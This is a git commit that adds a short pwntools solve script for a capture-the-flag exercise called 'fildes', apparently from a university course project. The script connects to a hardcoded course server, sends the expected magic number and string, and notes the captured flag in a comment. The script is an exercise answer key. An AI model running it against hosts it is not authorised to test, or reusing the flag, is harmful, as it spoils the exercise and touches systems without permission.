abc8c8fa98a4aea19e812c81483a5c4b25db300c
Sean Wei <me@sean.taipei>
2021-06-11 18:01:09 +0800

    Solve 1. fildes

---
+++ Project4-CTF/1-fildes/solve.py
@@ -0,0 +1,13 @@
+#!/usr/bin/env python3
+
+from pwn import remote
+
+r = remote('140.113.207.240', 8831)
+r.recvuntil('Give me a magic number')
+r.send(str(0xDEADBEAF))
+r.recvuntil('OK, then give me a magic string')
+r.sendline('YOUSHALLNOTPASS')
+r.recvuntil('Maybe you learn something :)')
+print(r.recvall(1))
+
+# Flag: FLAG{h1nj4kuHInJ4ku_muD4MudAmuda}
